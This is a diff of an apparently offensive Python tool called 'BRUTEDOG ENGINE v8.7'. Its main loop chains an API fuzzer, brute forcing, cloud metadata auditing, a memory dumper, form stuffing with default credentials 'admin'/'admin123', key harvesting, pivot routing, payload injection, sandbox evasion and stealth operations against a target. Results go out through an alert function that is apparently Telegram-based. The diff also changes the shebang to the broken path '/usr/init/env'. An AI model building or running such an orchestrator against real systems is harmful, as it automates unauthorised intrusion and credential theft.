@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/init/env python3
 """
 BRUTEDOG ENGINE v8.7 — State-Machine Logic & Cognitive Supreme Exploitation Engine (Elite Red Team Adversarial Edition)
 Features:
@@ -254,7 +254,7 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         (len(body.strip()) < 200 and "token" not in body_lower)
     )
     
-    has_valid_auth_indicator = any(k in body_lower for k in ["access_token", "\"role\":\"admin\"", "\"user_id\":", "auth_token", "session_id", "cryptobyte"])
+    has_valid_auth_indicator = any(k in body_lower for k in ["access_token", "\"role\":\"admin\"", "\"user_id\":", "auth_token", "session_id"])
     
     if status in [200, 201, 302] and not is_spa_shell and (has_valid_auth_indicator or "token" in body_lower):
         extracted_proof = {}
@@ -543,31 +543,26 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     # ==========================================================
     section("COMPREHENSIVE OFFENSIVE & RECON MODULE ASSAULT (V8.7)")
     try:
-        # 1. API Fuzzer (Safe async execution)
         if asyncio.iscoroutinefunction(run_api_fuzzer):
             await run_api_fuzzer(target_url)
         else:
             await asyncio.to_thread(run_api_fuzzer, target_url)
         dispatch_tg_alert("API Fuzzer Success", {"target": target_url})
 
-        # 2. Brute Force Engine (Safe async execution)
         if asyncio.iscoroutinefunction(execute_brute_force):
             await execute_brute_force(target_url)
         else:
             await asyncio.to_thread(execute_brute_force, target_url)
         dispatch_tg_alert("Brute Force Module Success", {"target": target_url})
 
-        # 3. Cloud Metadata & Apex Auditor
         cloud_res = audit_cloud_metadata(target_url)
         if cloud_res:
             dispatch_tg_alert("Cloud Apex Metadata Leak", cloud_res)
 
-        # 4. DOM Sink Inspector
         dom_res = inspect_dom_sinks(target_url)
         if dom_res:
             dispatch_tg_alert("DOM Sink Vulnerability", {"target": target_url})
 
-        # 5. Memory Dumper & Form Stuffer
         execute_memory_dumper(target_url)
         if asyncio.iscoroutinefunction(execute_form_stuffing):
             await execute_form_stuffing(target_url, "admin", "admin123")
@@ -577,19 +572,16 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
             except TypeError:
                 execute_form_stuffing(target_url)
 
-        # 6. Key Harvester & Pivot Routing
         harvest_keys(target_url)
         if asyncio.iscoroutinefunction(execute_pivot_routing):
             await execute_pivot_routing(target_url)
         else:
             execute_pivot_routing(target_url)
 
-        # 7. Adaptive Replayer & Payload Mutation
         replayer_res = await replay_and_inject_payloads(target_url)
         if replayer_res:
             dispatch_tg_alert("Adaptive Replay & Injection Success", {"target": target_url})
 
-        # 8. Sandbox Evader & Stealth Operations
         evade_sandbox()
         if asyncio.iscoroutinefunction(execute_stealth_operations):
             await execute_stealth_operations(target_url)
